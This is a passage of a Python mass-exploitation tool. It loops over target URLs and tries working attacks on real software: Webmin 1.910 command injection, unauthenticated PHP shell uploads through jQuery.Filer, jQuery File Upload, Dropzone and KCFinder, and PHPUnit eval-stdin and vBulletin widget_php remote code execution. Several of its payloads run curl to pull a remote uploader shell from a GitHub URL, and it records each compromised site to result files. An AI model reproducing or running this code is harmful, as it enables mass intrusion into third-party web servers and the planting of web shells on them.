			hhh = {				'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
				'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
				'Accept-Language': 'en-US,en;q=0.5',
				'Accept-Encoding': 'gzip, deflate',
				'Referer': url+':10000/session_login.cgi',
				'Cookie': 'redirect=1; testing=1; sid=x',
				'Connection': 'close',
				'Upgrade-Insecure-Requests': '1',
				'Content-Type': 'application/x-www-form-urlencoded',
				'Content-Length': '47'
			}
			command = ('uname -a')
			payload = 'user=root&pam=&expired=2&old=id|'+ command +'&new1=wheel&new2=wheel'
			r = requests.post(asdria, data=payload, headers=hhh, verify=False)
			if r.status_code == 200 and 'Failed to change password : The current password is incorrect' in r.content:
				print('[Webmin] {}{}{} ||{}Webmin 1.910 RCE Package Updates{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(url+':10000:'+'\n')
			else:
				print('[Webmin] {}{}{} ||{}Webmin 1.910 RCE Package Updates{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass
	def Webmin5(self, url):
		try:
			boole = url+':1000'
			asdria  = '{}/password_change.cgi'.format(boole)
			hhh = {				'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
				'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
				'Accept-Language': 'en-US,en;q=0.5',
				'Accept-Encoding': 'gzip, deflate',
				'Referer': url+':10000/session_login.cgi',
				'Cookie': 'redirect=1; testing=1; sid=x',
				'Connection': 'close',
				'Upgrade-Insecure-Requests': '1',
				'Content-Type': 'application/x-www-form-urlencoded',
				'Content-Length': '47'
			}
			command = ('uname -a')
			payload = 'user=root&pam=&expired=2&old=id|'+ command +'&new1=wheel&new2=wheel'
			r = requests.post(asdria, data=payload, headers=hhh, verify=False)
			if r.status_code == 200 and 'Failed to change password : The current password is incorrect' in r.content:
				print('[Webmin] {}{}{} ||{}Webmin 1.910 RCE Package Updates 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(url+':10000:'+'\n')
			else:
				print('[Webmin] {}{}{} ||{}Webmin 1.910 RCE Package Updates 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


class Others:
	def jqueryfilerb(self, url):
		# 
		try:
			data = {'files[]':open (php, 'rb')}
			p = (url+'/themes/assets/vendor/jquery.filer/examples/default/php/form_upload.php')
			c = (url+'/themes/assets/vendor/jquery.filer/uploads/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}jQuery.Filer{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}jQuery.Filer{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def jqueryfiler2(self, url):
		# 
		try:
			data = {'files[]':open (php, 'rb')}
			p = (url+'/theme/assets/vendor/jquery.filer/examples/default/php/form_upload.php')
			c = (url+'/theme/assets/vendor/jquery.filer/uploads/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}jQuery.Filer 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}jQuery.Filer 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass	

	def jqueryfiler3(self, url):
		# 
		try:
			data = {'files[]':open (php, 'rb')}
			p = (url+'/assets/assets/vendor/jquery.filer/examples/default/php/form_upload.php')
			c = (url+'/assets/assets/vendor/jquery.filer/uploads/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}jQuery.Filer 3{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}jQuery.Filer 3{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass	


	def jqueryfiler4(self, url):
		# 
		try:
			data = {'files[]':open (php, 'rb')}
			p = (url+'/web/assets/vendor/jquery.filer/examples/default/php/form_upload.php')
			c = (url+'/web/assets/vendor/jquery.filer/uploads/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}jQuery.Filer 4{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}jQuery.Filer 4{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass	


	def jqueryfiler5(self, url):
		# 
		try:
			data = {'files[]':open (php, 'rb')}
			p = (url+'/vendor/assets/vendor/jquery.filer/examples/default/php/form_upload.php')
			c = (url+'/vendor/assets/vendor/jquery.filer/uploads/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}jQuery.Filer 5{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}jQuery.Filer 5{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def jqueryfiler6(self, url):
		# 
		try:
			data = {'files[]':open (php, 'rb')}
			p = (url+'/client/assets/vendor/jquery.filer/examples/default/php/form_upload.php')
			c = (url+'/client/assets/vendor/jquery.filer/uploads/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}jQuery.Filer 6{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}jQuery.Filer 6{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def jqueryfiler7(self, url):
		# 
		try:
			data = {'files[]':open (php, 'rb')}
			p = (url+'/admin/assets/vendor/jquery.filer/examples/default/php/form_upload.php')
			c = (url+'/admin/assets/vendor/jquery.filer/uploads/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}jQuery.Filer 7{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}jQuery.Filer 7{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def jqueryfiler8(self, url):
		# 
		try:
			data = {'files[]':open (php, 'rb')}
			p = (url+'/sistemas/assets/vendor/jquery.filer/examples/default/php/form_upload.php')
			c = (url+'/sistemas/assets/vendor/jquery.filer/uploads/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}jQuery.Filer 8{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}jQuery.Filer 8{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def jqueryfiler9(self, url):
		# 
		try:
			data = {'files[]':open (php, 'rb')}
			p = (url+'/index/assets/vendor/jquery.filer/examples/default/php/form_upload.php')
			c = (url+'/index/assets/vendor/jquery.filer/uploads/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}jQuery.Filer 9{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}jQuery.Filer 9{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def jqueryfiler10(self, url):
		# 
		try:
			data = {'files[]':open (php, 'rb')}
			p = (url+'/examples/assets/vendor/jquery.filer/examples/default/php/form_upload.php')
			c = (url+'/examples/assets/vendor/jquery.filer/uploads/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}jQuery.Filer 10{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}jQuery.Filer 10{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def jqueryfiler11(self, url):
		# 
		try:
			data = {'files[]':open (php, 'rb')}
			p = (url+'/temp/assets/vendor/jquery.filer/examples/default/php/form_upload.php')
			c = (url+'/temp/assets/vendor/jquery.filer/uploads/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}jQuery.Filer 10.1{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}jQuery.Filer 10.1{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def jqueryfiler12(self, url):
		# 
		try:
			data = {'files[]':open (php, 'rb')}
			p = (url+'/data/assets/vendor/jquery.filer/examples/default/php/form_upload.php')
			c = (url+'/data/assets/vendor/jquery.filer/uploads/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}jQuery.Filer 10.2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}jQuery.Filer 10.2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def jqueryfiler13(self, url):
		# 
		try:
			data = {'files[]':open (php, 'rb')}
			p = (url+'/jquery.filer/examples/default/php/form_upload.php')
			c = (url+'/jquery.filer/uploads/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}jQuery.Filer 10.3{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}jQuery.Filer 10.3{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def jqueryfiler14(self, url):
		# 
		try:
			data = {'files[]':open (php, 'rb')}
			p = (url+'/assets/vendor/jquery.filer/examples/default/php/form_upload.php')
			c = (url+'/assets/vendor/jquery.filer/uploads/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}jQuery.Filer 10.4{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}jQuery.Filer 10.4{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass



	def jqueryfiler(self, url):
		# path
		# one

		try:
			path = ['/themes', '/theme', '/assets', '/vendor', '/web', '/sites', '/sites', '/assests', '/assets/vendor', '/php', '/admin', '/administrator', '/Adm', '/cgi', '/test', '/file', '/en', '/gb', '/id', '/adm', '/index', '/board', '/jquery', 'jqueryfiler', '/files', '/Themes', '/Theme', '/WP', '/Websites', '/uploads', '/upload', '/auto', '/img', '/of', '/blog', '/Myblog', '/Blog', '/Test', '/Dir', '/up', '/sistemas', '/Dev', '/dev', '/en-us', '/filer', '/old', '/OLD', '/new', '/New', '/My', '/en-gb', '/index.php', '/index.html', '/home', '/Home', '/Login', '/login', '/PHP', '/default', '/Default', '/Default_Sites', '/form', '/forum', '/Forum', '/server', '/Server', '/Modul', '/modul', '/Modules', '/modules',
					'/slide', '/Slide', '/Slides', '/slides', '/Board', '/board', '/data', '/Data'] # Pray!
			data = {'files[]':open (php, 'rb')}
			for dick in path:
				p = (url+dick+'/jquery.filer/examples/default/php/form_upload.php')
				c = (url+dick+'/jquery.filer/uploads/Uploader_By_Cloud7_Agath.php')
				asdfhj = requests.post(p, headers=headers, files=data)
				get = requests.get(c, headers=headers, timeout=10)
				if 'Uploader_By_Cloud7_Agath_' in get.content:
					print('[Others] {}{}{} ||{}jQuery.Filer Random Path{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/Others_Shell.txt', 'a').write(c+'\n')
				else:
					print('[Others] {}{}{} ||{}jQuery.Filer Random Path{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def jqueryfileup(self, url):
		try:
			data = {'files':open (php, 'rb')}
			p = (url+'/server/php/index.php')
			c = (url+'/server/php/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}jQuery File Upload{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}jQuery File Upload{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def jqueryfileup2(self, url):
		try:
			data = {'files':open (php, 'rb')}
			p = (url+'/jQuery-File-Upload-9.22.0/server/php/index.php')
			c = (url+'/jQuery-File-Upload-9.22.0/server/php/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}jQuery File Upload 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}jQuery File Upload 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def jqueryfileup3(self, url):
		try:
			data = {'files':open (php, 'rb')}
			p = (url+'/vendor/server/php/index.php')
			c = (url+'/vendor/server/php/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}jQuery File Upload 3{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}jQuery File Upload 3{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def jqueryfileup4(self, url):
		try:
			data = {'files':open (php, 'rb')}
			p = (url+'/assets/server/php/index.php')
			c = (url+'/assets/server/php/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}jQuery File Upload 4{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}jQuery File Upload 4{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def jqueryfileup5(self, url):
		try:
			data = {'files':open (php, 'rb')}
			p = (url+'/assets/vendor/server/php/index.php')
			c = (url+'/assets/vendor/server/php/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}jQuery File Upload 5{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}jQuery File Upload 5{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def jqueryfileup6(self, url):
		try:
			data = {'files':open (php, 'rb')}
			p = (url+'/jQuery-File-Upload/server/php/index.php')
			c = (url+'/jQuery-File-Upload/server/php/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}jQuery File Upload 6{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}jQuery File Upload 6{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def jqueryfileup7(self, url):
		try:
			data = {'files':open (php, 'rb')}
			p = (url+'/jqueryfileupload/server/php/index.php')
			c = (url+'/jqueryfileupload/server/php/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}jQuery File Upload 7{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}jQuery File Upload 7{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def jqueryfileup8(self, url):
		try:
			data = {'files':open(php, 'rb')}
			p = (url+'/uploads//server/php/index.php')
			c = (url+'/uploads//server/php/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}jQuery File Upload 8{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}jQuery File Upload 8{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def dropzone(self, url):
		# one
		# path
		# 

		try:
			data = {'file':open (php, 'rb')}
			path = ['admin', 'assets', 'dev', 'index', 'index.php', 'theme', 'themes', 'cgi', 'sites', 'files', 'file', 'upload', 'uploads'
					'administrator', 'adm', 'new', 'blog', 'data', 'vendor', 'php', 'server', 'en', 'en-us', 'slide', 'board', 'dashboard', 'main', 'home', 'my', 'dropzone']
			for dick in path:
				p = (url+'/'+dick+'/dropzone/upload.php')
				c = (url+'/'+dick+'/dropzone/uploads/Uploader_By_Cloud7_Agath.php')
				asdoj = requests.post(p, headers=headers, files=data)
				get = requests.get(c, headers=headers, timeout=8)
				if 'Uploader_By_Cloud7_Agath_' in get.content:
					print('[Others] {}{}{} ||{}Drop Zone Random Path{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/Others_Shell.txt', 'a').write(c+'\n')
				else:
					print('[Others] {}{}{} ||{}Drop Zone Random Path{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass

	def phpunit(self, url):
		# one
		# dir

		try:
			payload = "<?php system('curl https://raw.githubusercontent.com/NeloF4/RCE/master/One -O Uploader_By_Cloud7_Agath.php');?>"
			p = (url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php')
			c = (url+'/vendor/phpunit/phpunit/src/Util/PHP/Uploader_By_Cloud7_Agath.php')
			kjaf = requests.get(p, headers=headers, data=payload)
			get = requests.get(c, headers=headers, timeout=9)
			if "Uploader_By_Cloud7_Agath_" in get.content:
				print('[Others] {}{}{} ||{}PHPUNIT{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}PHPUNIT{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def phpunit1(self, url):
		# two
		# y

		try:
			payload = "<?php system('curl https://raw.githubusercontent.com/NeloF4/RCE/master/One -O Uploader_By_Cloud7_Agath.php');?>"
			p = (url+'/client/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php')
			c = (url+'/client/vendor/phpunit/phpunit/src/Util/PHP/Uploader_By_Cloud7_Agath.php')
			asdasd = requests.get(p, headers=headers, data=payload)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}PHPUNIT 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}PHPUNIT 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def phpunit2(self, url):
		# three
		# y

		try:
			payload = "<?php system('curl https://raw.githubusercontent.com/NeloF4/RCE/master/One -O Uploader_By_Cloud7_Agath.php');?>"
			p = (url+'/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php')
			c = (url+'/admin/vendor/phpunit/phpunit/src/Util/PHP/Uploader_By_Cloud7_Agath.php')
			gu = requests.get(p, headers=headers, data=payload)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}PHPUNIT 3{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}PHPUNIT 3{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def phpunit4(self, url):
		# four 
		# y

		try:
			payload = "<?php system('curl https://raw.githubusercontent.com/NeloF4/RCE/master/One -O Uploader_By_Cloud7_Agath.php');?>"
			p = (url+'/dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php')
			c = (url+'/dev/vendor/phpunit/phpunit/src/Util/PHP/Uploader_By_Cloud7_Agath.php')
			ytyrt = requests.get(p, headers=headers, data=payload)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}PHPUNIT 4{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}PHPUNIT 4{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def phpunit5(self, url):
		# 

		try:
			payload = "<?php system('curl https://raw.githubusercontent.com/NeloF4/RCE/master/One -O Uploader_By_Cloud7_Agath.php');?>"
			p = (url+'/assets/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php')
			c = (url+'/assets/vendor/phpunit/phpunit/src/Util/PHP/Uploader_By_Cloud7_Agath.php')
			ghaidb = requests.get(p, headers=headers, data=payload)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}PHPUNIT 5{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}PHPUNIT 5{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def phpunit6(self, url):


		try:
			payload = "<?php system('curl https://raw.githubusercontent.com/NeloF4/RCE/master/One -O Uploader_By_Cloud7_Agath.php');?>"
			p = (url+'/vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php')
			c = (url+'/vendor/vendor/phpunit/phpunit/src/Util/PHP/Uploader_By_Cloud7_Agath.php')
			ashj = requests.get(p, headers=headers, data=payload)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}PHPUNIT 6{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}PHPUNIT 6{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def phpunit7(self, url):

		try:
			payload = "<?php system('curl https://raw.githubusercontent.com/NeloF4/RCE/master/One -O Uploader_By_Cloud7_Agath.php');?>"
			p = (url+'/sistemas/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php')
			c = (url+'/sistemas/vendor/phpunit/phpunit/src/Util/PHP/Uploader_By_Cloud7_Agath.php')
			gkj = requests.get(p, headers=headers, data=payload)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}PHPUNIT 7{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}PHPUNIT 7{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def phpunit8(self, url):

		try:
			payload = "<?php system('curl https://raw.githubusercontent.com/NeloF4/RCE/master/One -O Uploader_By_Cloud7_Agath.php');?>"
			p = (url+'/index.php/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php')
			c = (url+'/index.php/vendor/phpunit/phpunit/src/Util/PHP/Uploader_By_Cloud7_Agath.php')
			jugh = requests.get(p, headers=headers, data=payload)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}PHPUNIT 8{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}PHPUNIT 8{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def vbulletinrce(self, url):

		params = {"routestring":"ajax/render/widget_php"}
		params2 = {"routestring":"ajax/render/widget_php"}

		try:
			cmd = 'uname -a'
			params["widgetConfig[code]"] = "echo shell_exec('uname -a); exit;"
			params2["widgetConfig[code]"] = "echo shell_exec('curl https://raw.githubusercontent.com/NeloF4/RCE/master/One -O Uploader_By_Cloud7_Agath.php'); exit;"
			p = (url+'/')
			pp = (url+'/')
			c = (url+'/Uploader_By_Cloud7_Agath.php')
			qqwr = requests.post(p, headers=headers, data=params, timeout=3)
			qqwr2 = requests.post(pp, headers=headers, data=params2, timeout=3)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}vBulletin RCE{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}vBulletin RCE{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass




	def kcfinder(self, url):

		try:

			data = {'qqfile':open (jd, 'rb')}
			p = (url+'/assets/ckeditor/kcfinder/upload.php')
			c = (url+'/assets/ckeditor/kcfinder/upload/files/Uploader_By_Cloud7_Agath.php.jd')
			hgrtgh = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}KCFINDER{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}KCFINDER{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def kcfinder2(self, url):

		try:

			data = {'qqfile':open (jd, 'rb')}
			p = (url+'/assets/admin/ckeditor/kcfinder/upload.php')
			c = (url+'/assets/admin/ckeditor/kcfinder/upload/files/Uploader_By_Cloud7_Agath.php.jd')
			iug = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
